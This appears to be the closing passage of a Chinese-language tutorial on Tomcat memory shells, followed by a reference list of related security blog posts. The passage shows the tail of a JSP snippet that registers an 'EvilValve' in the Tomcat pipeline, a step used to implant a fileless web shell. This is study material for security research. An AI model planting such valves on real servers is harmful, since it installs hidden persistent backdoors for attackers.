    standardContext.getPipeline().addValve(new EvilValve());
    out.println("Done!");
%>
```

## 参考文章

[Drunkbaby - Java 内存马系列 - 03 - Tomcat 之 Filter 型内存马](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/)

[枫 - Java 安全学习 —— 内存马](https://goodapple.top/archives/1355)

[Longlone - Tomcat - Servlet 型内存马](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/)

[su18 - 1.3.8. JavaWeb 内存马基础](https://www.javasec.org/javaweb/MemoryShell/)
